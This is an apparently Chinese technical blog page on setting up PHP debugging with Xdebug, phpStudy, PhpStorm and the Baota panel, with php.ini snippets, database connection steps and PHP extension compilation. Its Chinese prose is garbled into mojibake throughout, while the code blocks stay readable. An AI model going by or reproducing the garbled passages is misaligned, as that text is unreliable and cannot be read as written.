<p>åœ¨Repeateræœ€æ–°å‡ºç°çš„ä¸€éƒ¨åˆ†å°±æ˜¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424733.png" alt="image-20220111141531436"></p>
<p>ä¿®æ”¹ç„¶åä½¿ç”¨ç‚¹å‡»Goå³å¯å‘é€ä¿®æ”¹ä¹‹åçš„åŒ…ï¼ŒResponseæ¥æ”¶åé¦ˆçš„åŒ…å¹¶è§£æ</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHPç¯å¢ƒæ­å»º</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-02-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€è°ƒè¯•æ­å»º"   >
          <a href="#ä¸€ã€è°ƒè¯•æ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€è°ƒè¯•æ­å»º" class="headerlink" title="ä¸€ã€è°ƒè¯•æ­å»º"></a>ä¸€ã€è°ƒè¯•æ­å»º</h1>
      
        <h2 id="ğŸ”ºWindowsç‰ˆæœ¬"   >
          <a href="#ğŸ”ºWindowsç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºWindowsç‰ˆæœ¬" class="headerlink" title="ğŸ”ºWindowsç‰ˆæœ¬"></a>ğŸ”ºWindowsç‰ˆæœ¬</h2>
      
        <h2 id="1-å‰ç½®å®‰è£…"   >
          <a href="#1-å‰ç½®å®‰è£…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®å®‰è£…" class="headerlink" title="1.å‰ç½®å®‰è£…"></a>1.å‰ç½®å®‰è£…</h2>
      <p>phpstorm+phpStudy</p>
<p>è¿™ä¸¤ä¸ªéœ€è¦å…ˆè£…å¥½ï¼Œä¹‹ååˆ©ç”¨phpStudyä¸­è‡ªå¸¦çš„xdebugæ¥è°ƒè¯•</p>

        <h2 id="2-phpStudyè®¾ç½®"   >
          <a href="#2-phpStudyè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStudyè®¾ç½®" class="headerlink" title="2.phpStudyè®¾ç½®"></a>2.phpStudyè®¾ç½®</h2>
      
        <h3 id="1-phpç‰ˆæœ¬"   >
          <a href="#1-phpç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpç‰ˆæœ¬" class="headerlink" title="(1)phpç‰ˆæœ¬"></a>(1)phpç‰ˆæœ¬</h3>
      <p>è¿™é‡Œæˆ‘çš„phpé€‰æ‹©çš„æ˜¯å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png" alt="image-20220107105326110"></p>

        <h3 id="2-æ‰“å¼€xdebug"   >
          <a href="#2-æ‰“å¼€xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ‰“å¼€xdebug" class="headerlink" title="(2)æ‰“å¼€xdebug"></a>(2)æ‰“å¼€xdebug</h3>
      <p>å•å‡»è®¾ç½®-&gt;æ‰©å±•ç»„ä»¶ï¼Œè®¾ç½®å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png" alt="image-20220107105424985"></p>

        <h3 id="3-ä¿®æ”¹php-ini"   >
          <a href="#3-ä¿®æ”¹php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹php-ini" class="headerlink" title="(3)ä¿®æ”¹php.ini"></a>(3)ä¿®æ”¹php.ini</h3>
      <p>ç„¶åä¸»ç•Œé¢è®¾ç½®-&gt;php.ini-&gt;å•å‡»å¯¹åº”ç‰ˆæœ¬ï¼Œå³å¯æ‰“å¼€php.inié…ç½®æ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png" alt="image-20220107105552036"></p>
<p>æ‰“å¼€ä¹‹åï¼Œåœ¨æœ€ä¸‹é¢çš„xdebugè®¾ç½®å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/baocheng/p/5775938.html" >https://www.cnblogs.com/baocheng/p/5775938.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  ç›¸å…³çš„ä¼šæ›´åŠ è¯¦ç»†ã€‚</p>
<p>ä¸»è¦æ˜¯è®¾ç½®<code>xdebug.remote_handler</code>ï¼Œ<code>xdebug.remote_port</code>ï¼Œ<code>xdebug.remote_host</code>ï¼Œ<code>xdebug.profiler_enable</code>ï¼Œ<code>xdebug.idekey</code>ï¼Œ<code>xdebug.remote_enable</code></p>

        <h3 id="4-ç½‘ç«™è·¯å¾„è®¾ç½®"   >
          <a href="#4-ç½‘ç«™è·¯å¾„è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ç½‘ç«™è·¯å¾„è®¾ç½®" class="headerlink" title="(4)ç½‘ç«™è·¯å¾„è®¾ç½®"></a>(4)ç½‘ç«™è·¯å¾„è®¾ç½®</h3>
      <p>ä¸»ç•Œé¢ç½‘ç«™-&gt;ç®¡ç†-&gt;ä¿®æ”¹-&gt;æ ¹ç›®å½•ï¼Œç„¶åè®¾ç½®ä¸ºåœ¨phpStormä¸­å­˜æ”¾phpæ–‡ä»¶çš„ç›®å½•ï¼Œæ²¡æœ‰çš„å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ª</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png" alt="image-20220107111415751"></p>

        <h3 id="5-å¼€å¯æœåŠ¡"   >
          <a href="#5-å¼€å¯æœåŠ¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å¼€å¯æœåŠ¡" class="headerlink" title="(5)å¼€å¯æœåŠ¡"></a>(5)å¼€å¯æœåŠ¡</h3>
      <p>phpStudyä¸­å¼€å¯å¯¹åº”çš„ç½‘ç«™æœåŠ¡å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png" alt="image-20220107112835096"></p>

        <h2 id="3-phpstormè®¾ç½®"   >
          <a href="#3-phpstormè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpstormè®¾ç½®" class="headerlink" title="3.phpstormè®¾ç½®"></a>3.phpstormè®¾ç½®</h2>
      
        <h3 id="1-PHPç‰ˆæœ¬é€‰æ‹©"   >
          <a href="#1-PHPç‰ˆæœ¬é€‰æ‹©" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHPç‰ˆæœ¬é€‰æ‹©" class="headerlink" title="(1)PHPç‰ˆæœ¬é€‰æ‹©"></a>(1)PHPç‰ˆæœ¬é€‰æ‹©</h3>
      <p>ç‰ˆæœ¬é€‰æ‹©ä¹‹å‰æˆ‘ä»¬çš„è®¾ç½®å¥½çš„ç›¸å…³ç‰ˆæœ¬</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png" alt="image-20220107110300128"></p>
<p>è¿™é‡Œçš„CLI interpreteréœ€è¦é€‰æ‹©phpStudyä¸­çš„phpï¼Œç‚¹å‡»æ—è¾¹çš„<code>...</code>æŒ‰é’®ï¼Œæ‰¾åˆ°å¯¹åº”çš„php.exeæ·»åŠ å³å¯ï¼Œå¤§å¤šçš„è·¯å¾„å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png" alt="image-20220107110410950"></p>

        <h3 id="2-xdebugé…ç½®"   >
          <a href="#2-xdebugé…ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-xdebugé…ç½®" class="headerlink" title="(2)xdebugé…ç½®"></a>(2)xdebugé…ç½®</h3>
      <p>æ‰“å¼€phpstormï¼Œæ‰“å¼€setting-&gt;PHP-&gt;Debugï¼Œxdebugé…ç½®å¦‚ä¸‹ï¼Œä¸»è¦æ˜¯ç«¯å£å¯¹åº”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png" alt="image-20220107110012400"></p>
<p>PHP-&gt;Debug-&gt;DBGp Proxyï¼Œè¿›è¡Œç›¸å…³è®¾ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png" alt="image-20220107110614445"></p>

        <h3 id="3-æœåŠ¡å™¨ç«¯é…ç½®"   >
          <a href="#3-æœåŠ¡å™¨ç«¯é…ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æœåŠ¡å™¨ç«¯é…ç½®" class="headerlink" title="(3)æœåŠ¡å™¨ç«¯é…ç½®"></a>(3)æœåŠ¡å™¨ç«¯é…ç½®</h3>
      <p>setting-&gt;server</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png" alt="image-20220107110138638"></p>
<p>æ²¡æœ‰çš„è‡ªè¡Œ+å·æ·»åŠ ï¼Œåå­—è‡ªå·±å®šä¹‰</p>

        <h3 id="4-é…ç½®phpæ–‡ä»¶è·¯å¾„"   >
          <a href="#4-é…ç½®phpæ–‡ä»¶è·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-é…ç½®phpæ–‡ä»¶è·¯å¾„" class="headerlink" title="(4)é…ç½®phpæ–‡ä»¶è·¯å¾„"></a>(4)é…ç½®phpæ–‡ä»¶è·¯å¾„</h3>
      <p>Run-&gt;Edit Configurations</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png" alt="image-20220107110807337"></p>
<p>ç„¶åæ·»åŠ å¯¹åº”çš„è°ƒè¯•è·¯å¾„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png" alt="image-20220107111003896"></p>
<p>å¯¹åº”è®¾ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png" alt="image-20220107111151592"></p>

        <h2 id="4-å¼€å§‹è°ƒè¯•"   >
          <a href="#4-å¼€å§‹è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å¼€å§‹è°ƒè¯•" class="headerlink" title="4.å¼€å§‹è°ƒè¯•"></a>4.å¼€å§‹è°ƒè¯•</h2>
      <p>ç„¶ååœ¨phpStormä¸­å¯¹åº”ç½‘ç«™çš„ç›®å½•ä¸‹çš„æ–‡ä»¶å³å¯ä¸‹æ–­ç‚¹å¼€å§‹è°ƒè¯•</p>

        <h3 id="1-å¼€å§‹ç›‘å¬"   >
          <a href="#1-å¼€å§‹ç›‘å¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¼€å§‹ç›‘å¬" class="headerlink" title="(1)å¼€å§‹ç›‘å¬"></a>(1)å¼€å§‹ç›‘å¬</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png" alt="image-20220107111554195"></p>
<p>è®¾ç½®å¥½è°ƒè¯•ç¯å¢ƒï¼Œç„¶åç‚¹æ—è¾¹çš„ç”µè¯ï¼Œä½¿å…¶å˜æˆå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png" alt="image-20220107111631356"></p>

        <h3 id="2-è°ƒè¯•"   >
          <a href="#2-è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è°ƒè¯•" class="headerlink" title="(2)è°ƒè¯•"></a>(2)è°ƒè¯•</h3>
      <p>åœ¨æ–‡ä»¶ä¸­ä¸‹æ–­ç‚¹ï¼Œç‚¹å‡»debugå³å¯å¼€å§‹è°ƒè¯•</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png" alt="image-20220107112446079"></p>

        <h2 id="ğŸ”ºLinuxç‰ˆæœ¬"   >
          <a href="#ğŸ”ºLinuxç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºLinuxç‰ˆæœ¬" class="headerlink" title="ğŸ”ºLinuxç‰ˆæœ¬"></a>ğŸ”ºLinuxç‰ˆæœ¬</h2>
      
        <h2 id="1-å‰ç½®å®‰è£…-1"   >
          <a href="#1-å‰ç½®å®‰è£…-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®å®‰è£…-1" class="headerlink" title="1.å‰ç½®å®‰è£…"></a>1.å‰ç½®å®‰è£…</h2>
      <p>ç”¨çš„ä¹Ÿæ˜¯PHPSTORMå’Œå®å¡”linux</p>

        <h2 id="2-å®å¡”linuxè®¾ç½®"   >
          <a href="#2-å®å¡”linuxè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å®å¡”linuxè®¾ç½®" class="headerlink" title="2.å®å¡”linuxè®¾ç½®"></a>2.å®å¡”linuxè®¾ç½®</h2>
      
        <h3 id="1-å®‰è£…xdebug"   >
          <a href="#1-å®‰è£…xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å®‰è£…xdebug" class="headerlink" title="(1)å®‰è£…xdebug"></a>(1)å®‰è£…xdebug</h3>
      <p>å®‰è£…å¥½PHPä¹‹åï¼Œè®¾ç½®å®‰è£…PHPçš„æ‹“å±•</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png" alt="image-20220113110140841"></p>

        <h3 id="2-é…ç½®php-ini"   >
          <a href="#2-é…ç½®php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é…ç½®php-ini" class="headerlink" title="(2)é…ç½®php.ini"></a>(2)é…ç½®php.ini</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png" alt="image-20220113110241556"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">; å…è®¸è¿œç¨‹ å¯ä»¥ä¸º On æˆ–è€… 1 éƒ½è¡¨ç¤ºå¯ç”¨ ï¼Œ Off å’Œ 0 è¡¨ç¤ºå…³é—­å…³é—­</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">; è¿œç¨‹ä¸»æœºçš„ IP è¿™é‡Œæˆ‘ä»¬å¡«å†™ï¼Œå›ºå®šçš„ 127.0.0.1 è¿™é‡Œå†™çš„æ˜¯PHPSTORMæ‰€åœ¨çš„é‚£å°æœºå™¨ä¸Šçš„IP</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">; è°ƒè¯•è¿æ¥ç«¯å£ è¯·è®°ä½è¿™ä¸ªç«¯å£ï¼Œåç»­ä¼šç”¨åˆ°ã€‚æ­¤é…ç½®é¡¹é»˜è®¤å€¼ä¸º 9000 ï¼Œä½†æ˜¯é€šå¸¸ 9000 ç«¯å£è¢« fpm å æ® ï¼Œæ•…æ›´æ¢ç«¯å£ã€‚</span><br><span class="line">; å¦å¤–ï¼Œè¯·åœ¨ä½ æœåŠ¡å™¨çš„æ§åˆ¶é¢æ¿å’ŒæœåŠ¡å™¨é˜²ç«å¢™ä¸­å¼€æ”¾è¿™ä¸ªç«¯å£çš„è¿›å‡ºç«™ã€‚</span><br><span class="line">; å¦‚æœä½ æ˜¯å®å¡”é¢æ¿ç”¨æˆ· è¯·æ”¾è¡Œæ­¤ç«¯å£ã€‚</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">; æ¥ä¸‹æ¥çš„å€¼éƒ½æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æˆ‘æ¨èä½ ä½¿ç”¨</span><br><span class="line">; è¿æ¥ IDE çš„ Keyï¼Œè¯·è®°ä½ä»–ï¼Œå¯ä»¥è‡ªå·±è‡ªå®šä¹‰ï¼Œä¸»è¦ç”¨æ¥è¿‡æ»¤è¯·æ±‚ã€‚</span><br><span class="line">xdebug.idekey=PHPSTORM</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable=On</span><br></pre></td></tr></table></div></figure>

<p>å‚ç…§</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.t1h2ua.cn/archives/69" >Linuxå†…ç½‘æœåŠ¡å™¨+å®å¡”+Xdebugè¿œç¨‹è°ƒè¯•é…ç½® â€“ T1h2uaâ€™s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä¿å­˜ä¹‹åï¼Œé‡è½½ä¸€ä¸‹é…ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png" alt="image-20220113110410355"></p>

        <h3 id="3-ç½‘ç«™è·¯å¾„è®¾ç½®"   >
          <a href="#3-ç½‘ç«™è·¯å¾„è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç½‘ç«™è·¯å¾„è®¾ç½®" class="headerlink" title="(3)ç½‘ç«™è·¯å¾„è®¾ç½®"></a>(3)ç½‘ç«™è·¯å¾„è®¾ç½®</h3>
      <p>å®å¡”Linuxä¸­ç‚¹å‡»ç½‘ç«™ï¼Œæ·»åŠ ç«™ç‚¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png" alt="image-20220113110540548"></p>
<p>å¾—åˆ°å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png" alt="image-20220113110610661"></p>

        <h3 id="4-å¼€å¯æœåŠ¡"   >
          <a href="#4-å¼€å¯æœåŠ¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å¼€å¯æœåŠ¡" class="headerlink" title="(4)å¼€å¯æœåŠ¡"></a>(4)å¼€å¯æœåŠ¡</h3>
      <p>è®°å¾—æŠŠå¯¹åº”çš„æœåŠ¡æ‰“å¼€ï¼Œnginx/apacheå’Œphp</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png" alt="image-20220113110735466"></p>

        <h3 id="5-æ”¾è¡Œ9001ç«¯å£"   >
          <a href="#5-æ”¾è¡Œ9001ç«¯å£" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-æ”¾è¡Œ9001ç«¯å£" class="headerlink" title="(5)æ”¾è¡Œ9001ç«¯å£"></a>(5)æ”¾è¡Œ9001ç«¯å£</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png" alt="image-20220113111553907"></p>

        <h2 id="3-phpStormè®¾ç½®"   >
          <a href="#3-phpStormè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpStormè®¾ç½®" class="headerlink" title="3.phpStormè®¾ç½®"></a>3.phpStormè®¾ç½®</h2>
      <p>è¿™é‡Œå°±éƒ½å·®ä¸å¤šï¼Œé€‰æ‹©phpç‰ˆæœ¬ï¼Œé…ç½®xdebugï¼Œé…ç½®Serverï¼Œé…ç½®phpæ–‡ä»¶è·¯å¾„ï¼Œæ³¨æ„è¿™é‡Œé€‰å–çš„ç«¯å£ä¸º9001</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png" alt="image-20220113110926412"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png" alt="image-20220113111016050"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png" alt="image-20220113110938531"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png" alt="image-20220113111029912"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png" alt="image-20220113111210749"></p>
<p>ç„¶åå°±å¯ä»¥è°ƒè¯•äº†ã€‚</p>

        <h2 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h2>
      <p>xdebug3.0ä»¥ä¸Šçš„ï¼Œé…ç½®æœ‰ç‚¹å˜åŒ–ï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">xdebug.mode = develop,debug</span><br><span class="line">xdebug.start_with_request = default|default</span><br><span class="line">;xdebug.start_with_request = yes ;å½“æ”¹ä¸ºyesæ—¶æ‰€æœ‰è¯·æ±‚éƒ½ä¼šèµ°debugï¼Œä¸éœ€è¦è®¾ç½®idekey </span><br><span class="line">xdebug.client_host = 127.0.0.1 </span><br><span class="line">xdebug.client_port = 9001</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.cli_color = 2</span><br><span class="line">xdebug.var_display_max_depth = 15</span><br><span class="line">xdebug.var_display_max_data  = 2048</span><br></pre></td></tr></table></div></figure>




        <h1 id="äºŒã€æ•°æ®åº“æ­å»º"   >
          <a href="#äºŒã€æ•°æ®åº“æ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€æ•°æ®åº“æ­å»º" class="headerlink" title="äºŒã€æ•°æ®åº“æ­å»º"></a>äºŒã€æ•°æ®åº“æ­å»º</h1>
      
        <h2 id="1-phpStudyè®¾ç½®"   >
          <a href="#1-phpStudyè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpStudyè®¾ç½®" class="headerlink" title="1.phpStudyè®¾ç½®"></a>1.phpStudyè®¾ç½®</h2>
      
        <h3 id="1-åˆ›å»ºæ•°æ®åº“"   >
          <a href="#1-åˆ›å»ºæ•°æ®åº“" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ›å»ºæ•°æ®åº“" class="headerlink" title="(1)åˆ›å»ºæ•°æ®åº“"></a>(1)åˆ›å»ºæ•°æ®åº“</h3>
      <p>è®¾ç½®æ•°æ®åº“ï¼Œæ²¡æœ‰å°±åˆ›å»ºï¼Œé¼ æ ‡ç¢°åˆ°å¯†ç å¯ä»¥æŸ¥çœ‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png" alt="image-20220109115051455"></p>

        <h3 id="2-æ‰“å¼€MySQLæ•°æ®åº“"   >
          <a href="#2-æ‰“å¼€MySQLæ•°æ®åº“" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ‰“å¼€MySQLæ•°æ®åº“" class="headerlink" title="(2)æ‰“å¼€MySQLæ•°æ®åº“"></a>(2)æ‰“å¼€MySQLæ•°æ®åº“</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png" alt="image-20220109115216201"></p>

        <h2 id="2-phpStormè®¾ç½®"   >
          <a href="#2-phpStormè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStormè®¾ç½®" class="headerlink" title="2.phpStormè®¾ç½®"></a>2.phpStormè®¾ç½®</h2>
      
        <h3 id="1-è®¾ç½®"   >
          <a href="#1-è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è®¾ç½®" class="headerlink" title="(1)è®¾ç½®"></a>(1)è®¾ç½®</h3>
      <p>view-&gt;Tool Windows-&gt;databases</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png" alt="image-20220109115314160"></p>
<p>ç„¶ååˆ›å»ºä¸€ä¸ªè¿æ¥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png" alt="image-20220109115352472"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png" alt="image-20220109115418414"></p>
<p>å¯¹åº”è¾“å…¥hostï¼Œè´¦å·å¯†ç å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png" alt="image-20220109115447217"></p>

        <h3 id="2-æŸ¥çœ‹æ§åˆ¶"   >
          <a href="#2-æŸ¥çœ‹æ§åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æŸ¥çœ‹æ§åˆ¶" class="headerlink" title="(2)æŸ¥çœ‹æ§åˆ¶"></a>(2)æŸ¥çœ‹æ§åˆ¶</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png" alt="image-20220109115523944"></p>
<p>view-&gt;tool windows-&gt;databaseä¹‹åï¼ŒåŒå‡»ä¸Šé¢çº¢æ¡†å¯ä»¥è¿›å…¥æ§åˆ¶ç•Œé¢</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png" alt="image-20220109115615823"></p>
<p>ç„¶åå°±æ­£å¸¸äº†ã€‚</p>

        <h1 id="ä¸‰ã€PHPæ¨¡å—æ­å»º"   >
          <a href="#ä¸‰ã€PHPæ¨¡å—æ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€PHPæ¨¡å—æ­å»º" class="headerlink" title="ä¸‰ã€PHPæ¨¡å—æ­å»º"></a>ä¸‰ã€PHPæ¨¡å—æ­å»º</h1>
      
        <h2 id="1-åˆ›å»ºæ¨¡å—æ¨¡æ¿"   >
          <a href="#1-åˆ›å»ºæ¨¡å—æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ›å»ºæ¨¡å—æ¨¡æ¿" class="headerlink" title="1.åˆ›å»ºæ¨¡å—æ¨¡æ¿"></a>1.åˆ›å»ºæ¨¡å—æ¨¡æ¿</h2>
      <p>æ‰¾åˆ°phpæºç ç›®å½•</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101746346.png" alt="image-20220210174644261"></p>
<p>ç„¶åä½¿ç”¨<code>ext_skel</code>åˆ›å»ºä¸€ä¸ªæ¨¡æ¿</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=helloworld</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-ç¼–è¯‘æ¨¡å—"   >
          <a href="#2-ç¼–è¯‘æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç¼–è¯‘æ¨¡å—" class="headerlink" title="2.ç¼–è¯‘æ¨¡å—"></a>2.ç¼–è¯‘æ¨¡å—</h2>
      <p>éšåè¿›è¡Œç¼–è¯‘ï¼Œè·³è½¬åˆ°åˆšåˆšç”Ÿæˆçš„æ¨¡å—æ–‡ä»¶å¤¹è·¯å¾„<code>/path_to_php_src/ext/helloworld</code>ï¼Œç„¶åç¼–è¯‘</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/56/bin/phpize</span><br><span class="line">./configure  --with-php-config=/www/server/php/56/bin/php-config</span><br></pre></td></tr></table></div></figure>

